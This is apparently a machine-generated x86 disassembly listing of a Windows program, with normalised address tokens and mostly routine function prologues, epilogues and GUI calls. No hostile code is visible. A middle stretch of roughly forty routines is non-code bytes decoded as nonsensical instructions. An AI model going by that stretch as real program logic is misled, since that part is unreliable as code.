sub_46f580
sub [ rw-data ] 0x1
retn
sub_46f71f
jmp sub_4038c0
sub_46f726
pop ebx
pop ecx
pop ebp
retn
sub_46f751
jmp sub_4038c0
sub_46f758
pop ebp
retn
sub_46f75c
sub [ rw-data ] 0x1
retn
sub_46f8e4
push ebx
cmp [ eax + 0xb2 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0xb4 ]
call [ ebx + 0xb0 ]
sub_46f9e8
jmp sub_4038c0
sub_46f9ef
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46fa11
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403f64
retn
sub_46fa0a
jmp sub_4038c0
sub_46fa11
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46fa3d
jmp sub_4038c0
sub_46fa44
pop ebp
retn
sub_46fa48
sub [ rw-data ] 0x1
retn
sub_46fe5a
jmp sub_4038c0
sub_46fe61
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_46ffd9
jmp sub_4038c0
sub_46ffe0
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_47002d
jmp sub_4038c0
sub_470034
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_470245
jmp sub_4038c0
sub_47024c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_47041e
jmp sub_4038c0
sub_470425
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_470455
jmp sub_4038c0
sub_47045c
pop ebp
retn
sub_470460
sub [ rw-data ] 0x1
retn
sub_470868
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_441268
movsx eax [ esi + 0x8 ]
mov [ ebx + 0x234 ] eax
pop esi
pop ebx
retn
sub_4708e4
push ebx
mov ebx eax
mov eax ebx
call sub_444b00
mov eax ebx
call sub_470c84
test al al
je r-xdata
pop ebx
retn
mov eax ebx
call sub_471114
sub_470960
jmp sub_4038c0
sub_470967
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4709c0
jmp sub_4038c0
sub_4709c7
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_470a54
jmp sub_4038c0
sub_470a5b
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_470b5a
jmp sub_4038c0
sub_470b61
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_470c76
jmp sub_4038c0
sub_470c7d
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_470c84
push ebx
mov ebx eax
cmp [ ebx + 0x220 ] 0x0
setne al
pop ebx
retn
sub_470d49
jmp sub_4038c0
sub_470d50
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_470e24
mov eax [ eax + 0x208 ]
retn
sub_471072
jmp sub_4038c0
sub_471104
jmp sub_4038c0
sub_47110b
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_471154
xor edx edx
call sub_470a64
retn
sub_47115c
mov al 0x1
retn
sub_47134d
jmp sub_4038c0
sub_471354
mov al [ ebp - 0x1 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47153a
jmp sub_4038c0
sub_471541
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_471580
push ebx
mov ebx eax
mov eax edx
dec eax
mov edx eax
mov eax ebx
call sub_4715c4
mov edx eax
mov eax ebx
call sub_470ea4
pop ebx
retn
sub_4717d4
jmp sub_4038c0
sub_4717db
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_471867
jmp sub_4038c0
sub_47186e
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4718f5
jmp sub_4038c0
sub_4718fc
pop ebx
mov esp ebp
pop ebp
retn
sub_471a02
jmp sub_4038c0
sub_471a09
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_471c5a
jmp sub_4038c0
sub_471c61
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_471d04
mov edx [ rw-data ]
cmp [ edx + 0x4 ] 0x11
jne r-xdata
xor eax eax
retn
add al 0x5f
sub al 0x3f
jb r-xdata
mov al 0x1
retn
sub_471dea
jmp sub_4038c0
sub_471df1
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4720ae
jmp sub_4038c0
sub_4720b5
mov al [ ebp - 0x9 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_4724c8
jmp sub_4038c0
sub_4724cf
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_47255d
jmp sub_4038c0
sub_472564
pop ebp
retn
sub_472568
sub [ rw-data ] 0x1
retn
sub_473c20
cmp eax [ ecx ]
jl r-xdata
xor eax eax
retn
cmp eax [ ecx + 0x8 ]
jg r-xdata
cmp edx [ ecx + 0x4 ]
jl r-xdata
cmp edx [ ecx + 0xc ]
jle r-xdata
mov al 0x1
retn
sub_473f8b
jmp sub_4038c0
sub_473f92
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4740e8
push ebx
mov ebx edx
mov edx ebx
call sub_436468
or [ ebx + 0x4 ] 0x4
pop ebx
retn
sub_4740f8
mov [ eax + 0x240 ] edx
retn
sub_474100
retn
sub_47418c
push esi
mov eax [ eax + 0x240 ]
mov si 0xffe9
call sub_403368
pop esi
retn
sub_4741d4
push esi
mov eax [ eax + 0x240 ]
mov si 0xffb0
call sub_403368
pop esi
retn
sub_4746ac
push esi
push ecx
mov [ esp ] cl
mov cl [ esp ]
mov eax [ eax + 0x240 ]
mov si 0xffbb
call sub_403368
pop edx
pop esi
retn
sub_474740
push ebx
mov ebx eax
push 0xffffffff
push 0x7fffffff
push 0xb1
mov eax ebx
call sub_446450
push eax
call SendMessageA
pop ebx
retn
sub_474954
xor ecx ecx
call sub_47484c
retn
sub_47495c
mov cl 0x1
call sub_47484c
retn
sub_474a10
jmp sub_4038c0
sub_474a17
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_474cd0
jmp sub_4038c0
sub_474cd7
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_474e7c
push ebx
mov ebx eax
mov eax ebx
call sub_444d8c
test [ ebx + 0x249 ] 0x20
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_474fa8
sub_474ebc
mov al 0x1
retn
sub_474ec0
mov al 0x1
retn
sub_474ec4
mov al [ eax + 0x219 ]
retn
sub_474f78
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
call sub_403f40
pop ebp
retn 0x4
sub_474f88
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
call sub_403f40
pop ebp
retn 0x4
sub_474f98
push ebp
mov ebp esp
pop ebp
retn 0x4
sub_474fa0
xor eax eax
retn
sub_474fa4
xor eax eax
retn
sub_474fa8
mov [ eax + 0x28d ] 0x0
call sub_479664
retn
sub_474fb8
mov [ eax + 0x28d ] 0x1
call sub_479740
retn
sub_475000
mov [ eax + 0x280 ] 0xffffffff
mov [ eax + 0x284 ] 0xffffffff
call sub_479740
retn
sub_47531c
retn
sub_4753a4
retn
sub_4753a8
mov al 0x1
retn
sub_4753ac
retn
sub_475448
xchg ecx edx
push edi
mov edi eax
mov eax edx
[ edi ]
pop edi
retn
sub_476976
jmp sub_40360c
sub_476b91
jmp sub_4038c0
sub_476b98
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_476bb5
mov eax [ ebp - 0x4 ]
call sub_40316c
retn
sub_476bae
jmp sub_4038c0
sub_476bb5
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_476d20
jmp sub_4038c0
sub_476d27
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_476d44
mov eax [ ebp - 0x8 ]
call sub_40316c
retn
sub_476d3d
jmp sub_4038c0
sub_476d44
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_477024
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_477839
jmp sub_4038c0
sub_477840
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_4778a0
push ebp
mov ebp esp
call sub_477024
pop ebp
retn 0x4
sub_4778ac
push ebp
mov ebp esp
call sub_477024
pop ebp
retn 0x4
sub_478142
jmp sub_4038c0
sub_47817c
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_474088
retn
j_sub_40360c#2
jmp sub_40360c
sub_478b10
cmp [ ebp - 0x11 ] 0x0
je r-xdata
call sub_403974
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp - 0x4 ]
call sub_476bbc
sub_478f73
jmp sub_4038c0
sub_478f7a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_47911c
mov ecx [ eax + 0x250 ]
test ecx ecx
je r-xdata
mov eax [ eax + 0x234 ]
retn
cmp edx [ eax + 0x24c ]
jl r-xdata
mov eax [ ecx + edx * 4 + 0x4 ]
retn
sub_47913c
push ebx
push esi
mov esi edx
mov ebx eax
mov ecx esi
lea edx [ ebx + 0x210 ]
lea eax [ ebx + 0x228 ]
call sub_473bb8
pop esi
pop ebx
retn
sub_479158
mov ecx [ eax + 0x224 ]
test ecx ecx
jne r-xdata
mov eax [ ecx + edx * 4 + 0x4 ]
retn
mov al 0x1
retn
sub_47916c
push ebx
add esp 0xffffffa0
mov ebx eax
mov edx esp
mov eax ebx
call sub_476088
mov eax [ esp + 0x10 ]
sub eax [ ebx + 0x258 ]
inc eax
add esp 0x60
pop ebx
retn
sub_47918c
push ebx
add esp 0xffffffa0
mov ebx eax
mov edx esp
mov eax ebx
call sub_476088
mov eax [ esp + 0x40 ]
sub eax [ ebx + 0x25c ]
inc eax
add esp 0x60
pop ebx
retn
sub_4791ac
cmp dl [ eax + 0x218 ]
je r-xdata
retn
mov [ eax + 0x218 ] dl
call sub_44396c
sub_4791c0
cmp edx [ eax + 0x228 ]
je r-xdata
retn
push 0x1
mov ecx [ eax + 0x22c ]
call sub_476d4c
sub_4792d2
jmp sub_4038c0
sub_4792d9
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_479358
cmp edx [ eax + 0x240 ]
je r-xdata
retn
mov [ eax + 0x240 ] edx
call sub_477024
sub_4793f4
jmp sub_4038c0
sub_4793fb
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_47948c
jmp sub_4038c0
sub_479493
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4794c4
cmp edx [ eax + 0x244 ]
je r-xdata
retn
mov [ eax + 0x244 ] edx
call sub_477024
sub_479642
jmp sub_4038c0
sub_479649
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_479650
cmp dl [ eax + 0x254 ]
je r-xdata
retn
mov [ eax + 0x254 ] dl
call sub_44396c
sub_4796c3
jmp sub_4038c0
sub_479886
jmp sub_4038c0
sub_47988d
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4798f0
mov [ edx + 0xc ] 0x1
test [ eax + 0x249 ] 0x10
jne r-xdata
retn
test [ eax + 0x249 ] 0x8
je r-xdata
test [ eax + 0x249 ] 0x4
je r-xdata
or [ edx + 0xc ] 0x2
or [ edx + 0xc ] 0x80
sub_47996c
push ebx
mov ebx eax
mov eax ebx
call sub_441268
cmp [ ebx + 0x27c ] 0x0
je r-xdata
pop ebx
retn
call GetMessageTime
mov edx [ ebx + 0x27c ]
mov [ edx + 0x244 ] eax
sub_479afc
movsx ecx [ edx + 0x6 ]
push ecx
push 0x1
movsx ecx [ edx + 0x4 ]
mov edx 0x1
call sub_477450
retn
sub_479b14
movsx ecx [ edx + 0x6 ]
push ecx
push 0x1
movsx ecx [ edx + 0x4 ]
xor edx edx
call sub_477450
retn
sub_479bb1
jmp sub_4038c0
sub_479bb8
mov esp ebp
pop ebp
retn
sub_479bbc
push ebx
mov ebx eax
mov eax ebx
call sub_44168c
mov eax ebx
call sub_479b28
pop ebx
retn
sub_479c20
push ebx
mov ebx eax
mov eax ebx
call sub_445a68
mov eax ebx
call sub_44396c
pop ebx
retn
sub_479e84
push ebx
mov ebx eax
mov eax ebx
call sub_478034
mov eax ebx
call sub_479740
pop ebx
retn
sub_479e98
push ebx
mov ebx eax
mov eax ebx
call sub_478034
mov eax ebx
call sub_479740
pop ebx
retn
sub_479eac
push ebx
mov ebx eax
mov ecx [ ebx + 0x21c ]
dec ecx
mov eax ebx
call sub_475248
mov edx [ ebx + 0x21c ]
dec edx
mov eax ebx
call sub_4791d8
pop ebx
retn
sub_479ed0
push ebx
mov ebx eax
mov ecx [ ebx + 0x24c ]
dec ecx
mov eax ebx
call sub_475320
mov edx [ ebx + 0x24c ]
dec edx
mov eax ebx
call sub_479568
pop ebx
retn
sub_479fc4
push ebp
mov ebp esp
mov al 0x1
pop ebp
retn 0x4
sub_479fd0
push ebp
mov ebp esp
mov al 0x1
pop ebp
retn 0x4
sub_479fdc
push ebp
mov ebp esp
mov al 0x1
pop ebp
retn 0x4
sub_479fe8
push ebp
mov ebp esp
mov al 0x1
pop ebp
retn 0x4
sub_479ff4
push ebp
mov ebp esp
mov al 0x1
pop ebp
retn 0x4
sub_47a000
push ebp
mov ebp esp
mov al 0x1
pop ebp
retn 0x4
sub_47a00c
push ebx
mov ebx eax
mov eax ebx
call sub_445914
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
pop ebx
retn
mov eax ebx
call sub_478034
sub_47a028
push ebx
cmp [ eax + 0x29a ] 0x0
je r-xdata
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x29c ]
call [ ebx + 0x298 ]
sub_47a0c8
push ebx
cmp [ eax + 0x2ba ] 0x0
je r-xdata
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x2bc ]
call [ ebx + 0x2b8 ]
sub_47a1e4
push ebx
mov ebx eax
mov eax ebx
call sub_475408
cmp [ ebx + 0x2d2 ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x2d4 ]
call [ ebx + 0x2d0 ]
sub_47a4e8
jmp sub_4038c0
sub_47a4ef
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_47a7d9
jmp sub_4038c0
sub_47a7e0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47a860
push ebx
cmp [ eax + 0x26a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx [ eax + 0x240 ]
mov eax [ ebx + 0x26c ]
call [ ebx + 0x268 ]
sub_47abbf
jmp sub_4038c0
sub_47abc6
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47b154
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xec ]
mov eax [ ebx + 0x240 ]
call sub_479820
pop ebx
retn
sub_47b194
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_47b06c
mov edx esi
mov eax ebx
call sub_44168c
pop esi
pop ebx
retn
sub_47b251
jmp sub_4038c0
sub_47b258
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_47b31c
call sub_444080
retn
sub_47b54e
jmp sub_4038c0
sub_47b555
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_47b5e9
jmp sub_4038c0
sub_47b5f0
pop ebp
retn
sub_47b5f4
sub [ rw-data ] 0x1
retn
sub_47b6e2
inc edi
add [ ebp + esi + 0x44 ] dl
add [ eax - 0x3e ] ch
inc edi
add [ ecx + edi ] al
inc esp
add [ eax ] cl
cmp [ eax + eax - 0x40 ] eax
aaa
inc esp
add ah bl
retn 0x47
sub_47b778
inc edi
add ah ah
0x47
sub_47b77e
push esp
leave
inc edi
add [ eax + 0x40047c9 ] al
int3
sub_47c1b9
jmp sub_4038c0
sub_47c1c0
pop ecx
pop ebp
retn
sub_47c1c4
and eax 0xff
shl eax 0x10
and edx 0xff
or eax edx
retn
sub_47c1d8
shr eax 0x10
retn
sub_47c1dc
and eax 0xff
retn
sub_47c1e4
xor eax eax
retn
sub_47c350
push ebx
mov ebx edx
mov edx ebx
call sub_438724
test [ ebx + 0x4 ] 0x30
jne r-xdata
pop ebx
retn
or [ ebx + 0x4 ] 0x10
sub_47c374
push ebx
mov ebx eax
mov eax ebx
call sub_4459ac
mov eax ebx
call sub_47c388
pop ebx
retn
sub_47c56a
jmp sub_4038c0
sub_47cac4
push ebx
cmp [ eax + 0x28a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x28c ]
call [ ebx + 0x288 ]
sub_47cb88
call sub_437e3c
retn
sub_47cb90
call sub_437e5c
retn
sub_47cbc0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_47cb2c
test eax eax
setne al
pop esi
pop ebx
retn
sub_47cc78
cmp dl [ eax + 0x281 ]
je r-xdata
retn
mov [ eax + 0x281 ] dl
mov edx [ eax ]
call [ edx + 0x7c ]
sub_47ccf4
cmp edx [ eax + 0x298 ]
je r-xdata
retn
mov [ eax + 0x298 ] edx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_47cd08
cmp edx [ eax + 0x294 ]
je r-xdata
retn
mov [ eax + 0x294 ] edx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_47cd41
jmp sub_4038c0
sub_47cd48
pop ebp
retn
sub_47cd4c
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_47c140
sub_47d074
mov esp 0xa9ffcfff
[ esi - 0x63006201 ]
sub_47d080
inc edi
add [ eax - 0x19 ] dl
inc edi
add [ eax + 0x3c0047e7 ] bl
hlt
sub_47de6c
jmp sub_4038c0
sub_47de73
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_4034e8
pop [ fs : 0x0 ]
add esp 0xc
sub_47e00b
jmp sub_4038c0
sub_47e012
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_47e1b5
jmp sub_4038c0
sub_47e1bc
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_47e1c8
mov [ eax + 0x2e4 ] edx
mov ecx [ eax + 0x2f8 ]
test ecx ecx
je r-xdata
retn
mov [ ecx + 0x258 ] edx
sub_47e1fc
push esi
mov esi eax
mov eax [ esi + 0x2d8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax esi
call sub_47e768
pop esi
retn
sub_47e2a0
jmp sub_4038c0
sub_47e2a7
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_47e2c4
mov eax [ eax + 0x2dc ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_47e3d5
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ebx + 0x2dc80 ] cl
add [ ebx + 0xa892048 ] cl
mov ecx [ eax + 0x24 ]
mov [ edx + 0x4 ] ecx
retn
sub_47e3f0
mov eax [ eax + 0x2dc ]
mov ecx [ eax + 0x28 ]
mov [ edx ] ecx
mov ecx [ eax + 0x2c ]
mov [ edx + 0x4 ] ecx
retn
sub_47e404
push ebp
mov ebp esp
mov eax [ eax + 0x2dc ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x20 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x24 ] edx
pop ebp
retn 0x8
sub_47e420
push ebp
mov ebp esp
mov eax [ eax + 0x2dc ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x28 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x2c ] edx
pop ebp
retn 0x8
sub_47e572
jmp sub_4038c0
sub_47e579
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_47e6b2
jmp sub_4038c0
sub_47e738
push ebx
mov ebx eax
mov eax ebx
call sub_43efcc
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe8 ]
pop ebx
retn
sub_47e750
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe8 ]
mov eax ebx
call sub_479e84
pop ebx
retn
sub_47e790
call sub_479664
retn
sub_47e806
jmp sub_4038c0
sub_47e80d
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47e818
push ebx
mov ebx eax
cmp [ ebx + 0x2f0 ] 0x0
jne r-xdata
inc [ ebx + 0x2f0 ]
pop ebx
retn
mov eax ebx
call sub_47e2bc
mov edx [ eax ]
call [ edx + 0x14 ]
mov [ ebx + 0x2f4 ] eax
j_sub_4038c0#9
jmp sub_4038c0
sub_47e8df
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_47e988
jmp sub_4038c0
sub_47e98f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_47ea2d
jmp sub_4038c0
sub_47ea34
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47ebac
jmp sub_4038c0
sub_47ebb3
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47ebd0
lea eax [ ebp - 0xc ]
call sub_403f40
retn
j_sub_4038c0#8
jmp sub_4038c0
sub_47ebd0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
j_sub_4038c0#7
jmp sub_4038c0
sub_47ec80
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
j_sub_4038c0#6
jmp sub_4038c0
sub_47ed79
jmp sub_4038c0
sub_47ed80
mov al [ ebp - 0x5 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47ee75
jmp sub_4038c0
sub_47eebc
jmp sub_4038c0
sub_47eec3
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_47ef6b
jmp sub_4038c0
j_sub_4038c0#5
jmp sub_4038c0
sub_47f02d
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_47f13f
jmp sub_4038c0
sub_47f146
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_47f257
jmp sub_4038c0
sub_47f25e
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_47f3dc
mov dx [ eax + 0x248 ]
mov eax edx
retn
j_sub_40360c
jmp sub_40360c
sub_47f49c
push esi
mov esi eax
mov eax esi
call sub_47a00c
cmp [ esi + 0x1a6 ] 0x0
je r-xdata
pop esi
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0xe8 ]
sub_47f61c
jmp sub_4038c0
sub_47f623
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47f65c
push ebx
mov ebx eax
mov eax ebx
call sub_419e38
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
cmp [ ebx + 0x34 ] 0x0
je r-xdata
mov eax [ ebx + 0x34 ]
call sub_47e768
j_sub_4038c0#4
jmp sub_4038c0
sub_47f8a4
jmp sub_4038c0
sub_47f8ab
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
j_sub_4038c0#3
jmp sub_4038c0
sub_47fa49
mov eax esi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47fb16
jmp sub_4038c0
sub_47fb1d
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_47fb8a
jmp sub_4038c0
sub_47fb91
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_47fbb8
test dl dl
je r-xdata
mov [ eax + 0x4 ] ecx
test dl dl
je r-xdata
add esp 0xfffffff0
call sub_403490
retn
call sub_4034e8
pop [ fs : 0x0 ]
add esp 0xc
sub_47fc88
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_403f94
mov eax ebx
call sub_47fd48
pop esi
pop ebx
retn
sub_47fcb0
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebx + 0x1c ]
mov edx esi
call sub_403f94
pop esi
pop ebx
retn
sub_47fcc4
mov [ eax + 0x14 ] edx
call sub_47fd48
retn
sub_47fd3c
mov [ eax + 0x18 ] dl
call sub_47fd48
retn
sub_47fd48
mov edx [ eax + 0x4 ]
test edx edx
je r-xdata
retn
cmp [ edx + 0x28d ] 0x0
je r-xdata
mov ecx [ edx + 0x2dc ]
cmp [ ecx + 0x8 ] 0x0
jne r-xdata
mov eax edx
call sub_475000
j_sub_4038c0#2
jmp sub_4038c0
sub_47fde0
pop ebp
retn
sub_47fde4
sub [ rw-data ] 0x1
retn
sub_48022a
sub_48026f
xchg ebx eax
hlt
sub_48027b
retn 0xfbfb
j_sub_48022a
jmp sub_48022a
sub_4804d6
fcom [ edx ]
adc edx edx
sti
sti
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul esi [ eax + 0x17 ] 0x78
pop ss
mov [ 0xfffffffffbf77812 ] eax
sti
imul ebp [ ebx + 0x7e ] 0x3b
hlt
sub_480923
mov ebx 0x1312fbfb
sar ebx cl
sti
imul esp [ edx - 0x25edc482 ] 0xffffffb4
sti
sti
imul ebp [ ebx + 0x6b ] 0x6b
imul edx eax 0x9
hlt
sub_480d19
sti
sti
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
hlt
sub_480fb3
dec esp
r-xdata
jle r-xdata
0x7ef4
hlt
mov edx 0x8b04fbfb
not [ edx ]
sub_481344

sub_481514
cli
sti
sti
adc bh [ edi + 0x6bfbfbd8 ]
xchg ebx eax
sti

sub_4815b5
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x32 ] 0x38
imul ebp [ ebx + 0x6b ] 0x6b
mov [ 0xffffffff82123b7e ] al
fdivr st3
sti
hlt
sub_4817e5
dec esp
0xfbdae612 0x6bfb
sub_4817ed
xchg ecx eax

sub_4817ef
mov [ 0x12fa709f ] al
pop eax
0x706bfbfb 0x9122
sub_4818b6
0xaefbfbe3 0xde12
sub_4819b3
sti
hlt
sub_482570
dec esp
in al 0x12
cdq
adc [ esp + eax ] al
imul ebp [ ebx + 0x6b ] 0xffffff93
sti

sub_482641
out dx eax
sti
sti
sar [ esp + esi * 8 ] 0x7f
push 0x78fbfbee
lahf
fstp st7
sti
lodsd [ esi ]
cmp eax 0xfaefdfbf
adc ecx [ edx ]

sub_48265a
sti
sti
mov [ 0xffffffffdfbf72ad ] al
iretd
sub_482674

sub_4829b0
sti
sti
hlt
sub_4829b3
dec esp
0x23bf12a8 0x404
sub_4829bd

sub_482acf
xchg ecx eax
and [ ecx - 0x36518d63 ] 0x91
lahf
mov eax [ 0xffffffffcfae729d ]
xchg ecx eax
cdq
adc al bl
jmp r-xdata
sub_482b09
and edi [ esi + 0x4 ]
hlt
sub_483327
sti
sti
adc cl [ ecx + 0x6bfbfbe0 ]
imul ebp [ ebx + 0x6b ] 0xffffffc2
xchg [ edi ] al
hlt
sub_4835d7
mov esi 0x13abad4b
0xfbde
sub_48388d
sti
sti
sti
lodsb [ esi ]
add al 0xad
hlt
sub_483895
dec esp
mov eax 0x3b7e9dd7
hlt
sub_483bbb
cli
add eax 0x6b6b0404
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x4
mov edi 0x8778ebdf
fucomip st3
out dx eax
hlt
sub_4842ea
push ss
add al 0x4
hlt
sub_4842ee
dec esp
out dx eax
mov bh [ eax + 0x39 ]
sub edi [ eax + 0x1 ]
hlt
sub_4844b0
dec esp
mov eax 0x3b7e9dbf
hlt
sub_484ba7
mov esp 0xe3dfb704
hlt
sub_484ec7
push cs
add al 0x4
xchg ebx eax
sti
jmp r-xdata
add al 0x93
sub_48589c
dec esp

j_sub_4038c0
jmp sub_4038c0
sub_485b64
pop ebp
retn
sub_485d46
jmp sub_4038c0
sub_485d4d
pop edi
pop esi
pop ebx
pop ebp
retn
sub_485da2
retn
sub_485da3
jmp sub_4038c0
j_sub_485da2
jmp sub_485da2
sub_485daa
pop ebp
retn
